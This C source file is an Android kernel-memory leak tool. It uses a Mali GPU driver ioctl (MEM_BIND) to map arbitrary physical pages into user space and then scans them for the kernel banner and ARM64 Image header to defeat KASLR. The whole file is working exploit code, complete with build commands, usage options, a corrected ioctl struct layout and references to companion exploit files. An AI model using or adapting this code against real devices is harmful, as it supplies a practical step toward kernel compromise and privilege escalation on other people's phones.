/*
 * kort_leak_scan.c - 用推荐的物理映射原语「自泄露」内核地址
 *
 * 方法 (见 use.md §6 / uses.md 推导方法 / kort_phys_read2.c):
 *   1. MEM_BIND (CVE-2024-31317, nr=2, 0xC0288302) 把任意内核物理页绑到 GPU VA
 *   2. 对 /dev/mali 做 mmap -> 直接从 CPU 读该物理页
 *   3. 扫描内核 Image 定位基址:
 *        - "Linux version" 字符串 (最稳的 banner)
 *        - ARM64 Image header magic 0x644d5241 ("ARM\x64") @ +0x38 (= _stext 页)
 *   4. 由此拿到内核物理基址 -> 结合已知符号偏移即可绕过 kptr_restrict / KASLR
 *
 * 关键坑 (直接导致能否读):
 *   BIND_MEM 40 字节布局中 phys_addr 必须放偏移 24、rights 放 28
 *   (kort_phys_read.c 用 @20 -> mmap EFAULT 失败; 本文件用修正版 @24/@28)
 *
 * 安全: 纯只读测试, 零写入。每步 alarm() 超时保护防驱动挂起。
 *
 * 编译 (NDK 21.4, 32 位 armeabi-v7a, 静态):
 *   set NDK=C:\Users\Administrator\AppData\Local\Android\Sdk\ndk\21.4.7075529
 *   set CLANG=%NDK%\toolchains\llvm\prebuilt\windows-x86_64\bin\armv7a-linux-androideabi24-clang
 *   %CLANG% kort_leak_scan.c -o kort_leak_scan -static
 *
 * 用法:
 *   kort_leak_scan                扫描默认窗口 0x01000000..0x01400000 找内核基址
 *   kort_leak_scan -s 0x00800000 0x02000000   自定义扫描范围
 *   kort_leak_scan -p 0x01080000  dump 单页(Image 头 + banner 校验)
 *   kort_leak_scan -p 0x01080000 -d            额外 hexdump 0x200 字节
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <signal.h>
#include <getopt.h>
#include <sys/ioctl.h>
#include <sys/mman.h>

/* ---- Mali Utgard ioctl (r10p1, 已验证) ---- */
#define MALI_IOC_MEM_BIND   0xC0288302   /* _IOWR(0x83, 2, 40)  */
#define MALI_IOC_MEM_UNBIND 0xC0108303   /* _IOWR(0x83, 3, 16)  */

#define GPU_VA       0x41000000u        /* 绑定时用的 GPU 虚拟地址 */
#ifndef PAGE_SIZE
#define PAGE_SIZE    0x1000
#endif
#define BIND_FLAGS   0x800              /* _MALI_MEMORY_BIND_BACKEND_EXTERNAL_MEMORY */
#define BIND_RIGHTS  0x37

static volatile int g_to = 0;
static void alh(int s) { (void)s; g_to = 1; }

static int tio(int fd, unsigned int cmd, void *buf, int t) {
    alarm(t); g_to = 0;
    int r = ioctl(fd, cmd, buf);
    int e = errno;
    alarm(0);
    if (g_to) return -999;
    return r == 0 ? 0 : -e;
}

/* BIND 一页物理内存到 GPU_VA (修正布局: phys@24, rights@28) */
static int bind_phys(int fd, uint32_t phys, uint32_t gpu_va, uint32_t size) {
    uint8_t raw[40];
    memset(raw, 0, sizeof(raw));
    uint64_t ctx = 0;
    uint32_t vaddr = gpu_va, sz = size, fl = BIND_FLAGS, pa = phys, rights = BIND_RIGHTS;
    memcpy(raw + 0,  &ctx,    8);
    memcpy(raw + 8,  &vaddr,  4);
    memcpy(raw + 12, &sz,     4);
    memcpy(raw + 16, &fl,     4);
    memcpy(raw + 24, &pa,     4);
    memcpy(raw + 28, &rights, 4);
    return tio(fd, MALI_IOC_MEM_BIND, raw, 3);
}

/* best-effort 解绑, 避免扫描时映射堆积 */
static void unbind_phys(int fd, uint32_t gpu_va) {
    uint8_t raw[16];
    memset(raw, 0, sizeof(raw));
    uint64_t ctx = 0;
    uint32_t va = gpu_va;
    memcpy(raw + 0, &ctx, 8);
    memcpy(raw + 8, &va,  4);
    tio(fd, MALI_IOC_MEM_UNBIND, raw, 2);
}

/* 读一页: bind -> mmap(PROT_READ) -> copy -> munmap -> unbind
 * 返回 0 成功, out 至少 PAGE_SIZE 字节 */
static int read_page(int fd, uint32_t phys, uint8_t *out) {
    if (bind_phys(fd, phys, GPU_VA, PAGE_SIZE) != 0) return -1;
    void *m = mmap(NULL, PAGE_SIZE, PROT_READ, MAP_SHARED, fd, GPU_VA);
    if (m == MAP_FAILED) {
        unbind_phys(fd, GPU_VA);
        return -2;
    }
    memcpy(out, m, PAGE_SIZE);
    munmap(m, PAGE_SIZE);
    unbind_phys(fd, GPU_VA);
    return 0;
}

static int find_str(const uint8_t *p, int n, const char *s) {
    int ls = (int)strlen(s);
    if (ls <= 0 || ls > n) return -1;
    for (int i = 0; i + ls <= n; i++)
        if (memcmp(p + i, s, ls) == 0) return i;
    return -1;
}

static void hexdump(const uint8_t *b, int n) {
    for (int i = 0; i < n; i += 16) {
        printf("  %04x:", i);
        for (int j = 0; j < 16; j++) printf(" %02x", b[i + j]);
        printf("  ");
        for (int j = 0; j < 16; j++)
            printf("%c", (b[i+j] >= 0x20 && b[i+j] < 0x7f) ? b[i+j] : '.');
        printf("\n");
    }
}

/* 扫描: 在 [start,end) 逐页找 "Linux version" banner 与 ARM64 头 magic */
static void scan_range(int fd, uint32_t start, uint32_t end) {
    printf("[*] scan phys 0x%08x .. 0x%08x (step 0x%x)\n", start, end, PAGE_SIZE);
    uint8_t page[PAGE_SIZE];
    int found = 0;
    for (uint32_t pa = start; pa < end; pa += PAGE_SIZE) {
        int r = read_page(fd, pa, page);
        if (r != 0) continue;                       /* 失败/超时/不可映射页跳过 */

        int off_banner = find_str(page, PAGE_SIZE, "Linux version");
        /* ARM64 Image header magic @ +0x38 (little-endian 0x644d5241) */
        uint32_t magic = 0;
        if (PAGE_SIZE >= 0x3C) memcpy(&magic, page + 0x38, 4);
        int is_stext = (magic == 0x644d5241u);
        uint32_t code0 = 0;
        memcpy(&code0, page, 4);

        if (off_banner >= 0 || is_stext) {
            printf("\n[+] HIT phys=0x%08x", pa);
            if (is_stext)   printf("  ARM64_MAGIC(_stext)");
            if (off_banner >= 0) printf("  \"Linux version\"@+0x%x", off_banner);
            printf("\n");
            if (is_stext)
                printf("    code0=0x%08x (expect 0x14498000 for 4KB-page 4.9)\n", code0);
            if (off_banner >= 0) {
                /* 打印整行 banner */
                int e = off_banner;
                while (e < PAGE_SIZE && page[e] != '\n') e++;
                printf("    banner: ");
                for (int i = off_banner; i < e && i < PAGE_SIZE; i++) putchar(page[i]);
                printf("\n");
            }
            found++;
            if (found >= 4) { printf("\n[*] 已找到 %d 处, 停止扫描\n", found); break; }
        }
    }
    if (!found) printf("[-] 未在窗口内找到内核 Image, 用 -s 扩大/移动范围\n");
}

int main(int argc, char **argv) {
    struct sigaction sa; memset(&sa, 0, sizeof(sa)); sa.sa_handler = alh;
    sigaction(SIGALRM, &sa, NULL);
    setvbuf(stdout, NULL, _IONBF, 0);

    uint32_t start = 0x01000000u, end = 0x01400000u;
    uint32_t pa = 0; int have_pa = 0, dump = 0;

    int c;
    while ((c = getopt(argc, argv, "s:p:d")) != -1) {
        switch (c) {
        case 's': start = strtoul(optarg, 0, 0);
                  end   = strtoul(argv[optind], 0, 0); optind++; break;
        case 'p': pa = strtoul(optarg, 0, 0); have_pa = 1; break;
        case 'd': dump = 1; break;
        default: break;
        }
    }

    int fd = open("/dev/mali", O_RDWR);
    if (fd < 0) { perror("[-] open /dev/mali"); return 1; }
    printf("[+] opened /dev/mali fd=%d\n", fd);

    if (have_pa) {
        uint8_t page[PAGE_SIZE];
        printf("[*] read single page phys=0x%08x\n", pa);
        int r = read_page(fd, pa, page);
        if (r == -2) { printf("[-] mmap failed (EFAULT? 检查 phys@24/rights@28 布局)\n"); }
        else if (r != 0) { printf("[-] bind failed\n"); }
        else {
            uint32_t code0 = 0; memcpy(&code0, page, 4);
            uint32_t magic = 0; memcpy(&magic, page + 0x38, 4);
            printf("[+] read OK\n");
            printf("    code0=0x%08x  arm64_magic@+0x38=0x%08x (%s)\n",
                   code0, magic, magic == 0x644d5241u ? "HIT _stext" : "no");
            int ob = find_str(page, PAGE_SIZE, "Linux version");
            if (ob >= 0) printf("    \"Linux version\"@+0x%x\n", ob);
            if (dump) { printf("[*] dump 0x200:\n"); hexdump(page, 0x200); }
        }
    } else {
        scan_range(fd, start, end);
    }

    close(fd);
    printf("[*] done\n");
    return 0;
}
